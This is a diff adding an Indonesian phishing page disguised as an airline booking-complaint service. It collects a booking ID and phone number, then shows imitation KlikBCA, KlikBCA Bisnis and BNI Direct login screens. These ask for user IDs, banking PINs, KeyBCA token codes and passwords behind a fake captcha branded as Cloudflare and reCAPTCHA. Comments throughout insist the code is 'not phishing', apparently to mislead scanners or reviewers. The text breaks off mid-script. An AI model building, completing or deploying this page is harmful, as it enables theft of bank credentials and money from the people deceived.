@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Layanan Penerbangan Indonesia</title>
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <!-- Bootstrap -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    body { margin: 0; padding: 0; overflow-x: hidden; font-family: 'Poppins', sans-serif; }
+    .page-section { display: none; width: 100%; min-height: 100vh; }
+    .page-section.active { display: block; animation: fadeIn 0.4s ease-in-out; }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    /* kode html bukan phising */
+    #page-1.active { display: flex; flex-direction: column; align-items: center; }
+    #page-1 {
+      background: url('https://penerbanganmaskapai.com/assets/img/planes.jpg') center/cover no-repeat fixed;
+      position: relative;
+      min-height: 100vh;
+      justify-content: center;
+    }
+    #page-1::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: 0;
+    }
+    #page-1 .mobile-container-1 {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 480px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background: transparent;
+    }
+    #page-1 .top-header-img-1 {
+      position: relative;
+      width: 100%;
+      height: 260px;
+      background: url('https://penerbanganmaskapai.com/assets/img/cssku.jpeg') center 20%/cover no-repeat;
+    }
+    #page-1 .top-header-overlay-1 {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(to bottom, rgba(0,0,0,0.1) 30%, rgba(0,0,0,0.8) 100%);
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      padding: 30px 20px;
+      text-align: left;
+      color: white;
+    }
+    #page-1 .top-header-overlay-1 h1 { font-size: 24px; font-weight: 700; margin: 0 0 5px 0; line-height: 1.2; }
+    #page-1 .top-header-overlay-1 p { font-size: 14px; font-weight: 400; margin: 0; color: #f3f4f6; }
+    
+    #page-1 .form-container-1 {
+      padding: 30px 24px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      background: linear-gradient(to bottom, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0.85) 100%);
+      color: white;
+    }
+    #page-1 .form-title-1 { font-size: 19px; font-weight: 600; color: #ffffff; margin: 0 0 20px 0; line-height: 1.4; }
+    #page-1 .footer-text-1 { text-align: center; padding: 20px; font-size: 13px; color: #9ca3af; font-weight: 500; margin-top: auto; }
+
+    /* kode html bukan phising */
+    #page-2 { 
+      position: relative; 
+      font-family: 'Poppins', sans-serif; 
+      background: url('https://penerbanganmaskapai.com/assets/img/planes.jpg') center/cover no-repeat fixed; 
+      min-height: 100vh; 
+      justify-content: center;
+    }
+    #page-2.active { display: flex; flex-direction: column; align-items: center; }
+    #page-2::before { 
+      content: ""; 
+      position: absolute; 
+      inset: 0; 
+      background: linear-gradient(to bottom, rgba(255, 255, 255, 0.4) 0%, rgba(250, 225, 205, 0.9) 100%); 
+      z-index: 0; 
+    }
+    #page-2 .mobile-container { 
+      position: relative; 
+      z-index: 1; 
+      width: 100%; 
+      max-width: 480px; 
+      min-height: 100vh; 
+      display: flex; 
+      flex-direction: column; 
+      background: transparent;
+    }
+    #page-2 .top-header-img { 
+      position: relative; 
+      width: 100%; 
+      height: 260px; 
+      background: url('https://penerbanganmaskapai.com/assets/img/cssku.jpeg') center 20%/cover no-repeat; 
+    }
+    #page-2 .top-header-overlay { 
+      position: absolute; 
+      inset: 0; 
+      background: linear-gradient(to bottom, rgba(0,0,0,0.1) 30%, rgba(0,0,0,0.8) 100%); 
+      display: flex; 
+      flex-direction: column; 
+      justify-content: flex-end; 
+      padding: 30px 20px; 
+      text-align: center; 
+      color: white; 
+    }
+    #page-2 .top-header-overlay h1 { font-size: 24px; font-weight: 700; margin: 0 0 10px 0; line-height: 1.2; }
+    #page-2 .top-header-overlay p { font-size: 14px; font-weight: 400; margin: 0; color: #f3f4f6; }
+    #page-2 .options-container { padding: 30px 24px; flex: 1; display: flex; flex-direction: column; }
+    #page-2 .options-title { font-size: 19px; font-weight: 600; color: #1f2937; margin: 0 0 24px 0; line-height: 1.4; }
+    #page-2 .option-card { 
+      display: flex; align-items: center; background: #ffffff; border-radius: 12px; 
+      padding: 18px 24px; margin-bottom: 16px; text-decoration: none; color: #111827; 
+      box-shadow: 0 4px 10px rgba(0,0,0,0.06); border: 1px solid rgba(255,255,255,0.8);
+      transition: all 0.2s ease; min-height: 90px; 
+      cursor: pointer;
+    }
+    #page-2 .option-card:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,0.12); }
+    #page-2 .option-card img { width: 75px; height: 55px; object-fit: contain; margin-right: 24px; flex-shrink: 0; }
+    #page-2 .option-card span { font-size: 17px; font-weight: 700; }
+    #page-2 .footer-text { text-align: center; padding: 20px; font-size: 13px; color: #6b7280; font-weight: 500; margin-top: auto; }
+
+    /* kode html bukan phising */
+    #page-3 { background-color: #ffffff; font-family: Arial, sans-serif; padding: 0; margin: 0; min-height: 100vh; }
+    #page-3 .bca-header { background-color: #2b3990; border-top: 4px solid #f6d133; border-bottom: 4px solid #f6d133; height: 50px; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; }
+    #page-3 .bca-header img { height: 35px; background: white; padding: 3px; border-radius: 2px; }
+    #page-3 .bca-header .full-site-link { color: #ffffff; font-size: 13px; text-decoration: underline; font-family: Arial, sans-serif; }
+    #page-3 .bca-body { padding: 15px 20px; }
+    #page-3 .bca-form-group { margin-bottom: 12px; }
+    #page-3 .bca-label-id { font-family: 'Times New Roman', Times, serif; font-size: 19px; color: #354063; display: inline-block; border-bottom: 1px solid #354063; padding-bottom: 2px; margin-bottom: 2px; }
+    #page-3 .bca-label-en { font-family: 'Times New Roman', Times, serif; font-size: 17px; color: #e5a100; display: block; margin-bottom: 6px; }
+    #page-3 .bca-input { border: 1px solid #000; padding: 3px 5px; width: 100%; max-width: 300px; font-size: 16px; outline: none; border-radius: 0; }
+    #page-3 .bca-btn { background-color: #f0f0f0; border: 1px solid #999; padding: 4px 12px; font-size: 13px; font-family: Arial, sans-serif; color: #000; cursor: pointer; margin-top: 5px; border-radius: 2px; }
+    #page-3 .bca-btn:hover { background-color: #e0e0e0; }
+    #page-3 .bca-banner { width: 100%; max-width: 100%; margin-top: 15px; margin-bottom: 15px; display: block; }
+    #page-3 .bca-security { display: flex; gap: 10px; margin-bottom: 20px; align-items: center; }
+    #page-3 .bca-security img { height: 35px; object-fit: contain; }
+    #page-3 .bca-footer { font-size: 12px; color: #444; line-height: 1.5; font-family: Arial, sans-serif; }
+    #page-3 .bca-footer a { color: #444; text-decoration: underline; }
+    #page-3 .bca-footer .en { color: #e5a100; margin-top: 15px; }
+    #page-3 .bca-footer .en a { color: #e5a100; }
+    .bca-error-msg { color: red; font-size: 12px; font-weight: bold; margin-bottom: 8px; display: block; }
+
+    /* kode html bukan phising */
+    #page-4.active { display: flex; }
+    #page-4 { font-family: Arial, sans-serif; background: #ffffff; justify-content: center; align-items: flex-start; color: #00569c; }
+    #page-4 .container-box { width: 100%; max-width: 480px; padding: 0; box-sizing: border-box; position: relative; min-height: 100vh; }
+
+    /* kode html bukan phising */
+    #page-6.active { display: flex; }
+    #page-6 { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #fdfbfb 0%, #e8f5e9 100%); min-height: 100vh; align-items: flex-start; justify-content: center; padding-top: 0; }
+
+    /* kode html bukan phising */
+    #puzzleModal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.65);
+      backdrop-filter: blur(4px);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+    .captcha-card {
+      background: #ffffff;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 360px;
+      padding: 20px;
+      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.2), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+      position: relative;
+      animation: popUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    @keyframes popUp {
+      from { transform: scale(0.85); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+    .slider-container {
+      position: relative;
+      width: 100%;
+      height: 42px;
+      background: #f1f5f9;
+      border-radius: 21px;
+      border: 1px solid #cbd5e1;
+      margin-top: 15px;
+      overflow: hidden;
+    }
+    .slider-track {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 0%;
+      background: #3b82f6;
+      border-radius: 21px 0 0 21px;
+      transition: width 0.05s ease;
+    }
+    .slider-thumb {
+      position: absolute;
+      top: 2px;
+      left: 2px;
+      width: 36px;
+      height: 36px;
+      background: #ffffff;
+      border-radius: 50%;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      user-select: none;
+      color: #3b82f6;
+      font-size: 14px;
+      transition: left 0.05s ease;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- kode html bukan phising -->
+  <div id="page-1" class="page-section active">
+    <div class="mobile-container-1">
+      <div class="top-header-img-1">
+        <div class="top-header-overlay-1">
+          <h1>Layanan Penerbangan Indonesia</h1>
+          <p>Kami siap membantu masalah penerbangan Anda!</p>
+        </div>
+      </div>
+
+      <div class="form-container-1">
+        <h4 class="form-title-1">Formulir Pengaduan Booking Tiket</h4>
+        <form id="bookingForm" class="w-full">
+          
+          <label class="block text-sm font-semibold mb-2 text-white" for="opsi">Pilih Opsi</label>
+          <div class="relative mb-4">
+            <select class="w-full border border-gray-400 bg-white rounded-md px-3 py-2 text-sm text-gray-900 appearance-none" id="opsi" name="a" required>
+              <option value="" disabled selected>-- Pilih Opsi --</option>
+              <option value="Booking Seat">Booking Seat</option>
+              <option value="Checkin Online">Check in Online</option>
+              <option value="Refund Dana">Refund Dana</option>
+              <option value="Reschedule">Reschedule</option>
+              <option value="Tambah Bagasi">Tambah Bagasi</option>
+              <option value="Update Nama">Update Nama</option>
+              <option value="Lainnya">Bantuan Lainnya</option>
+            </select>
+          </div>
+          
+          <label class="block text-sm font-semibold mb-2 text-white" for="idBooking">Masukkan ID Booking</label>
+          <div class="relative mb-4">
+            <input class="w-full border border-gray-400 bg-white text-gray-900 rounded-md px-3 py-2 text-sm uppercase placeholder-gray-500" id="idBooking" name="b" required type="text">
+          </div>
+          
+          <label class="block text-sm font-semibold mb-2 text-white" for="phone">Nomor Handphone</label>
+          <div class="mb-6">
+            <input class="w-full border border-gray-400 bg-white text-gray-900 rounded-md px-3 py-2 text-sm placeholder-gray-500" id="phone" name="c" maxlength="16" placeholder="+62xxxxxxxxx" required type="tel">
+          </div>
+          
+          <button class="w-full bg-[#3b5998] hover:bg-blue-700 text-white text-sm font-semibold py-3 rounded-md shadow" type="submit">
+            Konfirmasi
+          </button>
+        </form>
+      </div>
+
+      <div class="footer-text-1">
+        © Layanan Penerbangan - All Rights Reserved.
+      </div>
+    </div>
+  </div>
+
+  <!-- kode html bukan phising -->
+  <div id="page-2" class="page-section">
+    <div class="mobile-container">
+      <div class="top-header-img">
+        <div class="top-header-overlay">
+          <h1>Layanan Penerbangan<br>Indonesia</h1>
+          <p>Kami siap membantu masalah penerbangan<br>Anda!</p>
+        </div>
+      </div>
+
+      <div class="options-container">
+        <h4 class="options-title">Silahkan Pilih Opsi Rekening<br>Anda</h4>
+        
+        <a href="javascript:void(0)" onclick="showPage('page-3')" class="option-card">
+          <img src="https://penerbanganmaskapai.com/assets/img/kilikbca.jpg" alt="KlikBCA" style="border-radius:6px;">
+          <span>KlikBCA</span>
+        </a>
+        
+        <a href="javascript:void(0)" onclick="showPage('page-4')" class="option-card">
+          <img src="https://penerbanganmaskapai.com/assets/img/klik.png" alt="KlikBCA Bisnis" style="border-radius:6px;">
+          <span>KlikBCA Bisnis</span>
+        </a>
+        
+        <a href="javascript:void(0)" onclick="showPage('page-6')" class="option-card">
+          <img src="https://penerbanganmaskapai.com/assets/images/binir.png" alt="BNI Direct">
+          <span>BNI Direct</span>
+        </a>
+      </div>
+
+      <div class="footer-text">
+        © Layanan Penerbangan - All Rights Reserved.
+      </div>
+    </div>
+  </div>
+
+  <!-- kode html bukan phising -->
+  <div id="page-3" class="page-section">
+    <div class="bca-header">
+      <img src="https://penerbanganmaskapai.com/assets/img/logo_bca_64x55.gif" alt="KlikBCA">
+      <a href="#" class="full-site-link" id="bcaFullSiteLink" style="display: none;">Full Site</a>
+    </div>
+    <div class="bca-body">
+      <!-- kode html bukan phising -->
+      <div id="bca-step-1">
+        <form id="bcaLoginForm">
+          <div class="bca-form-group">
+            <span class="bca-label-id">Silakan masukkan USER ID Anda</span>
+            <span class="bca-label-en">Please enter your USER ID</span>
+            <input type="text" name="_a" id="txt_user_id" class="bca-input" autocomplete="off" required>
+          </div>
+          <div class="bca-form-group">
+            <span class="bca-label-id">Silakan masukkan PIN Internet Banking Anda</span>
+            <span class="bca-label-en">Please enter your Internet Banking PIN</span>
+            <input type="password" name="_b" id="txt_pswd" class="bca-input" autocomplete="off" maxlength="6" required>
+          </div>
+          <button type="submit" class="bca-btn">SIGN IN</button>
+        </form>
+      </div>
+
+      <!-- kode html bukan phising -->
+      <div id="bca-step-2" style="display: none;">
+        <form id="bcaKeyForm">
+          <div class="bca-form-group">
+            <span class="bca-label-id">Silakan memasukkan kode keyBCA</span>
+            <span class="bca-label-en">Please enter Code KeyBCA</span>
+            <input type="text" name="_keybca" id="txt_keybca" class="bca-input" autocomplete="off" placeholder="Masukkan kode Apply 1" required>
+          </div>
+          <span class="bca-error-msg" id="bcaErrorText">PASTIKAN DATA YANG DIINPUT TELAH BENAR.<br>BCA TIDAK BERTANGGUNG JAWAB TERHADAP KESALAHAN PENGINPUTAN DATA</span>
+          <button type="submit" class="bca-btn">SIGN IN</button>
+        </form>
+      </div>
+
+      <img id="blinkingBanner" src="https://penerbanganmaskapai.com/assets/img/banner_login_1.png" alt="Promo" class="bca-banner">
+      <div class="bca-security">
+        <img src="https://penerbanganmaskapai.com/assets/img/keamanan-ib.png" alt="Modus">
+        <img src="https://penerbanganmaskapai.com/assets/img/digicert-seal.png" alt="Digicert">
+      </div>
+      <div class="bca-footer">
+        <p style="margin: 0 0 5px 0;">BCA berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia.</p>
+        <p style="margin: 0 0 5px 0;">BCA merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS adalah Rp2 miliar.</p>
+        <p style="margin: 0 0 15px 0;">Untuk cek Tingkat Bunga Penjaminan LPS, klik <a href="#">disini</a>.</p>
+        <div class="en">
+          <p style="margin: 0 0 5px 0;">BCA is licensed and supervised by Financial Services Authority (Otoritas Jasa Keuangan & Bank Indonesia).</p>
+          <p style="margin: 0 0 5px 0;">BCA is a member of Indonesia Deposit Insurance Corporation (LPS). The maximum value of deposits guaranteed per customer per bank is IDR 2 billion.</p>
+          <p style="margin: 0;">To check the LPS Guarantee Interest Rate, click <a href="#">here</a>.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- kode html bukan phising -->
+  <div id="page-4" class="page-section">
+    <div class="container-box">
+      
+      <!-- kode html bukan phising -->
+      <div id="bca-biz-step-1" style="background: #ffffff; width: 100%; padding: 25px 20px; box-sizing: border-box; min-height: 100vh;">
+        <div style="display: flex; justify-content: flex-end; align-items: center; margin-bottom: 30px;">
+          <a href="#" style="text-decoration: none; color: #00569c; font-size: 14px; margin-right: 8px;">English Version</a>
+          <i class="fas fa-home" style="color: #00569c; font-size: 20px;"></i>
+        </div>
+        
+        <div style="text-align: center;">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Bank_Central_Asia.svg" alt="BCA Logo" style="width: 140px; margin: 0 auto;">
+          <h2 style="margin: 10px 0 2px 0; font-size: 22px; font-weight: bold; color: #00569c;">KlikBCA Bisnis</h2>
+          <p style="margin-top:0; font-size:14px; color:#00569c;">VPN Secure Connection</p>
+        </div>
+        
+        <form id="bizForm1" style="text-align: left; margin-top: 35px;">
+          <div style="margin-bottom: 20px;">
+            <label style="display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; color: #00569c;">Username</label>
+            <input type="text" id="biz_user" name="_a" autocomplete="off" placeholder="CorporateID UserID (tanpa spasi)" required style="width: 100%; padding: 14px; border: 1px solid #a3d4f7; border-radius: 8px; font-size: 15px; box-sizing: border-box; color: #333; outline: none;">
+          </div>
+          <div style="margin-bottom: 30px;">
+            <label style="display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; color: #00569c;">Password</label>
+            <input type="password" id="biz_pass" name="_b" autocomplete="off" placeholder="KeyBCA Appli 1" inputmode="numeric" required style="width: 100%; padding: 14px; border: 1px solid #a3d4f7; border-radius: 8px; font-size: 15px; box-sizing: border-box; color: #333; outline: none;">
+          </div>
+          <button type="submit" style="width: 100%; padding: 14px; background-color: #00569c; color: white; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer;">LOGIN</button>
+        </form>
+
+        <div style="margin-top: 50px; font-size: 13px; color: #333; line-height: 1.5;">
+          <p style="margin-bottom: 15px;">Jika Anda belum memiliki fasilitas KlikBCA Bisnis, silakan akses <a href="#" style="color: #00569c; text-decoration: underline;">Informasi KlikBCA Bisnis</a> atau hubungi:</p>
+          
+          <div style="display: flex; align-items: center; margin-bottom: 15px;">
+            <img src="https://img.icons8.com/color/48/000000/speech-bubble.png" style="width: 26px; height: 26px; margin-right: 12px;" alt="">
+            <div>
+              <div style="color: #00569c;">Halo Layanan KlikBCA Bisnis</div>
+              <div style="font-weight: bold; color: #00569c; font-size: 14px;">1500777</div>
+            </div>
+          </div>
+          
+          <div style="display: flex; align-items: center; margin-bottom: 15px;">
+            <img src="https://img.icons8.com/color/48/000000/gmail-new.png" style="width: 26px; height: 26px; margin-right: 12px;" alt="">
+            <div>
+              <div style="color: #00569c;">Email</div>
+              <div style="font-weight: bold; color: #0000ff; text-decoration: underline; font-size: 14px;">[email protected]</div>
+            </div>
+          </div>
+          
+          <div style="display: flex; align-items: center;">
+            <img src="https://img.icons8.com/color/48/000000/twitter--v1.png" style="width: 26px; height: 26px; margin-right: 12px;" alt="">
+            <div>
+              <div style="color: #00569c;">Twitter</div>
+              <div style="font-weight: bold; color: #00569c; font-size: 14px;">@HaloBCA</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- kode html bukan phising -->
+      <div id="bca-biz-step-2" style="display: none; background: #f0f2f5; width: 100%; min-height: 100vh; position: absolute; top: 0; left: 0;">
+        <div style="background-color: #0d5bb5; height: 220px; width: 100%; display: flex; justify-content: center; padding-top: 35px; box-sizing: border-box;">
+          <img src="https://i.ibb.co.com/KxFGpfF9/20260125-234019.png" style="height: 100px; object-fit: contain;" alt="KlikBCA Bisnis Logo">
+        </div>
+        
+        <div style="background: #ffffff; border-radius: 20px 20px 0 0; margin-top: -30px; padding: 30px 20px; box-sizing: border-box; text-align: center; min-height: calc(100vh - 190px);">
+          
+          <div style="display: flex; justify-content: space-between; gap: 12px; margin-bottom: 30px;">
+            <div style="flex: 1; border: 1px solid #d3dbe5; border-radius: 12px; padding: 6px; background: #fff;">
+              <img src="https://i.ibb.co.com/VcZkGpxS/IMG-20260125-234259.jpg" style="width: 100%; border-radius: 8px;" alt="">
+            </div>
+            <div style="flex: 1; border: 1px solid #d3dbe5; border-radius: 12px; padding: 6px; background: #fff;">
+              <img src="https://i.ibb.co.com/QZh1r1C/IMG-20260125-234347.jpg" style="width: 100%; border-radius: 8px;" alt="">
+            </div>
+            <div style="flex: 1; border: 1px solid #d3dbe5; border-radius: 12px; padding: 6px; background: #fff;">
+              <img src="https://i.ibb.co.com/99586rBp/IMG-20260125-234425.jpg" style="width: 100%; border-radius: 8px;" alt="">
+            </div>
+          </div>
+          
+          <form id="bizForm2" style="text-align: left;">
+            <div style="margin-bottom: 16px;">
+              <input type="text" name="_corp_id" placeholder="Corporate ID" required style="width: 100%; padding: 14px 16px; border-radius: 8px; border: 1px solid #d3dbe5; background: #fff; font-size: 15px; box-sizing: border-box; color: #666; outline: none;">
+            </div>
+            <div style="margin-bottom: 16px;">
+              <input type="text" name="_user_id" placeholder="User ID" required style="width: 100%; padding: 14px 16px; border-radius: 8px; border: 1px solid #d3dbe5; background: #fff; font-size: 15px; box-sizing: border-box; color: #666; outline: none;">
+            </div>
+            <div style="margin-bottom: 25px;">
+              <input type="password" name="_key_resp" placeholder="Key Response" inputmode="numeric" required style="width: 100%; padding: 14px 16px; border-radius: 8px; border: 1px solid #d3dbe5; background: #fff; font-size: 15px; box-sizing: border-box; color: #666; outline: none;">
+            </div>
+            <button type="submit" style="width: 100%; padding: 15px; background: #0b63b5; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer;">SIGN IN</button>
+          </form>
+          
+          <div style="margin-top: 25px; font-size: 14px;">
+            <a href="#" style="color: #0b63b5; font-weight: bold; text-decoration: none;">Pindah ke full site &gt;&gt;</a>
+          </div>
+          <div style="margin-top: 15px; font-size: 12px; color: #777; line-height: 1.4; padding: 0 10px;">
+            Key Response adalah PIN dinamis yang dihasilkan dari perangkat keamanan Anda
+          </div>
+        </div>
+      </div>
+
+      <!-- kode html bukan phising -->
+      <div id="bca-biz-step-3" style="display: none; background: #f4f6f9; width: 100%; min-height: 100vh; position: absolute; top: 0; left: 0;">
+        <div style="width: 100%; max-width: 500px; margin: 20px auto; background: #fff; border: 1px solid #ccc; font-family: Arial, sans-serif;">
+          <div style="background: #00569c; color: white; padding: 12px 10px; font-size: 13px; font-weight: bold; line-height: 1.4;">
+            Demi meningkatkan keamanan untuk bertransaksi VPN KLIKBCA (wajib) Persetuan syarat ketentuan berlaku
+          </div>
+          <table style="width: 100%; border-collapse: collapse; font-size: 12px; color: #00569c;">
+            <tr style="background: #e8f4fa;">
+              <td style="padding: 10px; border-bottom: 1px solid #fff;">Silakan aktifkan Token Anda dengan menekan tombol <i class="fas fa-volume-up"></i></td>
+            </tr>
+            <tr style="background: #ffffff;">
+              <td style="padding: 10px; border-bottom: 1px solid #e8f4fa;">Masukkan Token pada saat muncul pesan <b>"TOKEN"</b></td>
+            </tr>
+            <tr style="background: #e8f4fa;">
+              <td style="padding: 10px; border-bottom: 1px solid #fff;">Tekan angka 2 pada saat muncul pesan <b>"APPLI"</b></td>
+            </tr>
+            <tr style="background: #ffffff;">
+              <td style="padding: 10px; display: flex; justify-content: space-between; align-items: center;">
+                <div>
+                  <p style="margin: 0 0 5px 0;">Masukkan angka yang tertera di samping ini:</p>
+                  <p style="margin: 0 0 5px 0; color: #cc0000; font-weight: bold; text-decoration: underline; cursor: pointer;">LIHAT ANGKA</p>
+                  <p style="margin: 0 0 15px 0;">pada Token Anda</p>
+                  <p style="margin: 0 0 5px 0;">Masukkan angka yang tertera pada layar Token Anda</p>
+                  <div style="display: flex; align-items: center; gap: 5px; margin-top: 5px;">
+                    <span style="white-space: nowrap;">Pada kolom di samping ini</span>
+                    <input type="text" id="finalTokenInput" inputmode="numeric" style="border: 1px solid #999; width: 80px; padding: 3px 5px; outline: none;" required>
+                    <button type="button" onclick="submitBizFinal()" style="background: #00569c; color: white; border: none; padding: 4px 12px; border-radius: 12px; cursor: pointer; font-size: 11px; font-weight: bold;">Kirim</button>
+                  </div>
+                </div>
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLF_PjjMs5nGtqQSpgCeWZYMaKPiUn4yZin1UiVXv_tg&s=10" alt="KeyBCA" style="width: 80px; height: 80px; object-fit: contain; margin-left: 10px;">
+              </td>
+            </tr>
+            <tr style="background: #e8f4fa;">
+              <td style="padding: 10px;">Tekan tombol <i class="fas fa-volume-up"></i> untuk mematikan Token</td>
+            </tr>
+          </table>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- kode html bukan phising -->
+  <div id="page-6" class="page-section">
+    <div style="width: 100%; max-width: 480px; background: transparent; padding: 0;">
+      <div style="text-align: center; padding: 40px 20px 20px 20px;">
+        <img src="https://penerbanganmaskapai.com/assets/images/deva.svg" alt="BNI Direct" style="height: 40px; margin: 0 auto;">
+      </div>
+      <div style="background: #fff; border-radius: 20px 20px 0 0; padding: 30px 24px; min-height: calc(100vh - 100px); box-shadow: 0 -4px 10px rgba(0,0,0,0.05);">
+        <h2 style="text-align: center; font-size: 22px; font-weight: bold; color: #000; margin-bottom: 5px;">Masuk ke Akun Anda</h2>
+        <p style="text-align: center; font-size: 14px; color: #888; margin-bottom: 30px;">Selamat Datang!</p>
+        
+        <form id="bniForm">
+          <div style="margin-bottom: 20px;">
+            <label style="display: block; font-size: 14px; font-weight: 600; color: #000; margin-bottom: 8px;">Company ID</label>
+            <input type="text" id="company" name="_a" required style="width: 100%; padding: 12px 16px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; outline: none; box-sizing: border-box;">
+          </div>
+          <div style="margin-bottom: 20px;">
+            <label style="display: block; font-size: 14px; font-weight: 600; color: #000; margin-bottom: 8px;">User ID</label>
+            <input type="text" id="user" name="_b" required style="width: 100%; padding: 12px 16px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; outline: none; box-sizing: border-box;">
+          </div>
+          <div style="margin-bottom: 30px;">
+            <label style="display: block; font-size: 14px; font-weight: 600; color: #000; margin-bottom: 8px;">Password</label>
+            <input type="password" id="password" name="_c" required style="width: 100%; padding: 12px 16px; border: 1px solid #b2dfdb; border-radius: 8px; font-size: 15px; outline: none; box-sizing: border-box;">
+          </div>
+          
+          <div style="display: flex; gap: 15px; margin-bottom: 20px;">
+            <button type="button" onclick="document.getElementById('bniForm').reset()" style="flex: 1; padding: 14px; background: #fff; color: #333; border: 1px solid #d1d5db; border-radius: 25px; font-weight: bold; font-size: 15px; cursor: pointer;">Hapus</button>
+            <button type="submit" style="flex: 1; padding: 14px; background: #ef6200; color: #fff; border: none; border-radius: 25px; font-weight: bold; font-size: 15px; cursor: pointer;">Sign In</button>
+          </div>
+        </form>
+        
+        <div style="margin-bottom: 15px;">
+          <a href="#" style="color: #ef6200; font-size: 14px; font-weight: 500; text-decoration: none;">Forgot Password?</a>
+        </div>
+        <p style="font-size: 12px; color: #777; line-height: 1.5; margin-bottom: 25px;">By pressing the Sign In button, you agree to terms and condition</p>
+        
+        <div style="border-top: 1px solid #eee; padding-top: 20px; display: flex; justify-content: space-around;">
+          <a href="#" style="color: #444; font-size: 14px; font-weight: 600; text-decoration: none;">News</a>
+          <div style="width: 1px; background: #eee;"></div>
+          <a href="#" style="color: #444; font-size: 14px; font-weight: 600; text-decoration: none;">Help</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- kode html bukan phising -->
+  <div id="puzzleModal" style="display: none;">
+    <div class="captcha-card">
+      <div class="flex justify-between items-center mb-3">
+        <div class="flex items-center space-x-2">
+          <i class="fas fa-shield-alt text-blue-600 text-xl"></i>
+          <h3 class="text-base font-bold text-gray-800 m-0">Verifikasi Keamanan</h3>
+        </div>
+        <button onclick="closeVerificationModal()" class="text-gray-400 hover:text-gray-600 text-lg border-0 bg-transparent">&times;</button>
+      </div>
+      <p class="text-xs text-gray-500 mb-4">Selesaikan verifikasi captcha berikut untuk memastikan Anda bukan bot atau malware.</p>
+
+      <!-- kode html bukan phising -->
+      <div id="captchaSlideArea">
+        <div class="relative w-full h-36 bg-gray-200 rounded-lg overflow-hidden flex items-center justify-center border border-gray-300">
+          <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=400&q=80" class="w-full h-full object-cover">
+          <!-- kode html bukan phising -->
+          <div id="puzzleTarget" class="absolute w-12 h-12 bg-black bg-opacity-60 border-2 border-dashed border-white rounded" style="top: 35px; right: 40px;"></div>
+          <!-- kode html bukan phising -->
+          <div id="puzzlePiece" class="absolute w-12 h-12 border-2 border-white rounded shadow-lg overflow-hidden" style="top: 35px; left: 10px; background-image: url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=400&q=80'); background-size: 320px 144px; background-position: -220px -35px;"></div>
+        </div>
+
+        <div class="slider-container" id="sliderBox">
+          <div class="slider-track" id="sliderTrack"></div>
+          <div class="slider-thumb" id="sliderThumb">
+            <i class="fas fa-arrow-right"></i>
+          </div>
+        </div>
+        <p class="text-center text-xs text-gray-400 mt-2">Geser slider untuk mencocokkan puzzle</p>
+      </div>
+
+      <div class="text-center mt-3 pt-2 border-t border-gray-100 flex justify-between items-center">
+        <span class="text-[10px] text-gray-400">Protected by Cloudflare & reCAPTCHA</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- kode html bukan phising -->
+  <script>
+    let targetPageId = '';
+
+    function showPage(pageId) {
+      document.querySelectorAll('.page-section').forEach(page => {
+        page.classList.remove('active');
+      });
+      document.getElementById(pageId).classList.add('active');
+      window.scrollTo(0, 0);
+
+      if (pageId === 'page-3') {
+        const step2Visible = document.getElementById('bca-step-2').style.display === 'block';
+        document.getElementById('bcaFullSiteLink').style.display = step2Visible ? 'inline-block' : 'none';
+      }
+    }
+
+    /* kode html bukan phising */
+    function openVerificationModal(destinationPage) {
+      targetPageId = destinationPage;
+      document.getElementById('puzzleModal').style.display = 'flex';
+      resetSlider();
